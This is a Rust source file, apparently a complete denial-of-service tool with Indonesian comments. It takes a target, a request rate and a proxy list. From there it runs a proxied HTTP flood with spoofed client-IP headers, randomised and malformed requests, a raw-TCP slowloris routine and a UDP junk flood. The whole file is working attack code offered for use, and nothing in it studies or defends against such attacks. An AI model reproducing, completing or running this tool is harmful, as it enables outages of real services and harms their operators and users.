mod lib;
use lib::*;
use std::{env, sync::Arc, time::{Duration, Instant}};
use reqwest::{Client, Proxy};
use rand::{seq::SliceRandom, Rng};
use tokio::sync::Semaphore;
use futures::stream::{FuturesUnordered, StreamExt};

// -- RAW TCP SLOWLORIS STYLE --
async fn slowloris_attack(host: &str, port: u16, duration_sec: u64) {
    use tokio::net::TcpStream;
    use tokio::io::AsyncWriteExt;
    let addr = format!("{}:{}", host, port);
    let end = Instant::now() + Duration::from_secs(duration_sec);
    while Instant::now() < end {
        if let Ok(mut stream) = TcpStream::connect(&addr).await {
            let method = random_method();
            let path = random_path(&vec!["/".into()]);
            let headers = format!(
                "{} {} HTTP/1.1\r\nHost: {}\r\nX-SLOW: yes\r\nUser-Agent: {}\r\n\r\n",
                method, path, host, random_str(12)
            );
            for b in headers.bytes() {
                stream.write_all(&[b]).await.ok();
                tokio::time::sleep(tokio::time::Duration::from_millis(rand::thread_rng().gen_range(80..400))).await;
            }
            // Never send body! (slowloris)
            tokio::time::sleep(tokio::time::Duration::from_secs(10)).await;
        }
    }
}

// -- RAW UDP JUNK --
async fn udp_junk(host: &str, port: u16, duration_sec: u64) {
    use tokio::net::UdpSocket;
    let sock = UdpSocket::bind("0.0.0.0:0").await.unwrap();
    let addr = format!("{}:{}", host, port);
    let end = Instant::now() + Duration::from_secs(duration_sec);
    while Instant::now() < end {
        let buf: Vec<u8> = (0..rand::thread_rng().gen_range(40..700)).map(|_| rand::random::<u8>()).collect();
        let _ = sock.send_to(&buf, &addr).await;
        tokio::time::sleep(tokio::time::Duration::from_millis(rand::thread_rng().gen_range(1..8))).await;
    }
}

#[tokio::main]
async fn main() {
    let args: Vec<String> = env::args().collect();
    if args.len() < 5 {
        eprintln!("Usage: {} [rps] [threads] [proxies.txt] [target]", args[0]);
        std::process::exit(1);
    }
    let rps: usize = args[1].parse().unwrap();
    let threads: usize = args[2].parse().unwrap();
    let proxyfile = &args[3];
    let target = &args[4];
    let duration_sec = 30;

    // Load all lists
    let proxies = Arc::new(load_file(proxyfile));
    let referers = Arc::new(load_file("referers.txt"));
    let useragents = Arc::new(load_file("useragents.txt"));
    let ciphers = Arc::new(load_file("ciphers.txt"));
    let sigalgs = Arc::new(load_file("sigalgs.txt"));
    let paths = Arc::new(load_file("paths.txt"));
    let langs = Arc::new(load_file("lang_header.txt"));
    let accepts = Arc::new(load_file("accept_header.txt"));
    let encodings = Arc::new(load_file("encoding_header.txt"));
    let controles = Arc::new(load_file("controle_header.txt"));

    let client_base = Arc::new(
        Client::builder()
            .pool_idle_timeout(Duration::from_secs(60))
            .danger_accept_invalid_certs(true)
            .tcp_nodelay(true)
            .build()
            .unwrap()
    );
    let semaphore = Arc::new(Semaphore::new(threads));
    let start = Instant::now();

    let mut handles = Vec::with_capacity(threads + 2);

    // -- Brutal async HTTP flood --
    for _ in 0..threads {
        let (paths, proxies, referers, useragents, ciphers, sigalgs, langs, accepts, encodings, controles) =
            (Arc::clone(&paths), Arc::clone(&proxies), Arc::clone(&referers), Arc::clone(&useragents),
            Arc::clone(&ciphers), Arc::clone(&sigalgs), Arc::clone(&langs), Arc::clone(&accepts),
            Arc::clone(&encodings), Arc::clone(&controles));
        let target = target.to_string();
        let client_base = Arc::clone(&client_base);
        let semaphore = Arc::clone(&semaphore);

        handles.push(tokio::spawn(async move {
            let _permit = semaphore.acquire().await.unwrap();
            let rps_per_thread = rps / threads.max(1);

            while start.elapsed().as_secs() < duration_sec {
                let mut batch = FuturesUnordered::new();
                for _ in 0..rps_per_thread.max(1) {
                    let client = if !proxies.is_empty() {
                        let proxy = pick_random(&proxies, "");
                        if !proxy.is_empty() {
                            Arc::new(
                                Client::builder()
                                    .danger_accept_invalid_certs(true)
                                    .proxy(Proxy::all(proxy).unwrap())
                                    .build()
                                    .unwrap()
                            )
                        } else { Arc::clone(&client_base) }
                    } else { Arc::clone(&client_base) };

                    let mut rng = rand::thread_rng();
                    let path = random_path(&paths);
                    let url = format!("{}{}", target, path);
                    let user_agent = pick_random(&useragents, "Mozilla/5.0").to_string();
                    let referer = pick_random(&referers, "https://google.com").to_string();
                    let cipher = pick_random(&ciphers, "TLS_AES_128_GCM_SHA256").to_string();
                    let sigalg = pick_random(&sigalgs, "ecdsa_secp256r1_sha256").to_string();
                    let lang = pick_random(&langs, "en-US,en;q=0.5").to_string();
                    let accept = pick_random(&accepts, "*/*").to_string();
                    let encoding = pick_random(&encodings, "gzip, deflate, br").to_string();
                    let controle = pick_random(&controles, "no-cache").to_string();
                    let fake_ip = random_ip();
                    let cookies = random_cookies();
                    let content_type = random_content_type();

                    // Header base
                    let mut base_headers = vec![
                        ("User-Agent", user_agent),
                        ("Referer", referer),
                        ("X-Forwarded-For", fake_ip.clone()),
                        ("X-Real-IP", fake_ip),
                        ("Accept", accept),
                        ("Accept-Encoding", encoding),
                        ("Accept-Language", lang),
                        ("Cache-Control", controle),
                        ("TLS-Cipher", cipher),
                        ("TLS-SigAlg", sigalg),
                        ("Cookie", cookies),
                        ("Content-Type", content_type.clone()),
                        ("Connection", if rng.gen_bool(0.5) { "close".into() } else { "keep-alive".into() }),
                        ("X-HTTP-Version", random_http_version().into()),
                    ];
                    let headers = random_headers(&base_headers);

                    // RANDOM METHOD (standar/aneh)
                    let method_str = random_method();
                    let method = reqwest::Method::from_bytes(method_str.as_bytes()).unwrap_or(reqwest::Method::GET);
                    let mut req = client.request(method.clone(), &url)
                        .timeout(Duration::from_secs(7));
                    for (k,v) in headers {
                        req = req.header(k, v);
                    }

                    // Super aneh: 40% request body random binary/emoji, 20% body kosong
                    let mut do_body = false;
                    if ["POST","PUT","PATCH","DELETE","BREACH","FOOBAR","HACK"].contains(&method_str.as_str()) || rng.gen_bool(0.4) {
                        do_body = true;
                    }
                    if do_body {
                        if content_type.contains("multipart") && rng.gen_bool(0.5) {
                            let mut form = reqwest::multipart::Form::new();
                            let field_count = rng.gen_range(1..5);
                            for _ in 0..field_count {
                                let field_name = random_str(rng.gen_range(3..8));
                                let field_val = random_str(rng.gen_range(10..20));
                                form = form.text(field_name, field_val);
                            }
                            req = req.multipart(form);
                        } else if rng.gen_bool(0.3) {
                            let emojibody: String = (0..rng.gen_range(10..100)).map(|_| char::from_u32(rng.gen_range(0x1F600..0x1F64F)).unwrap_or('x')).collect();
                            req = req.body(emojibody);
                        } else if rng.gen_bool(0.3) {
                            req = req.body(random_payload());
                        } else if rng.gen_bool(0.2) {
                            req = req.body("");
                        } else {
                            req = req.body(random_str(rng.gen_range(15..100)));
                        }
                    }

                    // Kadang request invalid
                    if rng.gen_bool(0.1) {
                        req = req.header("Content-Length", "");
                    }
                    if rng.gen_bool(0.1) {
                        req = req.header("Transfer-Encoding", "chunked, identity, gzip");
                    }
                    // Kadang burst, kadang delay
                    if rng.gen_bool(0.6) {
                        let delay = rng.gen_range(0..15);
                        if delay > 0 { tokio::time::sleep(tokio::time::Duration::from_millis(delay)).await; }
                    }
                    batch.push(req.send());
                }
                while let Some(_res) = batch.next().await {}
            }
        }));
    }

    // -- RAW TCP SLOWLORIS/FRAGMENTED (ultra gila) --
    if let Ok(url) = url::Url::parse(target) {
        if let Some(host) = url.host_str() {
            let port = url.port_or_known_default().unwrap_or(80);
            handles.push(tokio::spawn(slowloris_attack(host, port, duration_sec)));
            handles.push(tokio::spawn(udp_junk(host, port, duration_sec)));
        }
    }

    for h in handles {
        let _ = h.await;
    }
    println!("SELESAI (SUPER DUPER GILA)!");
}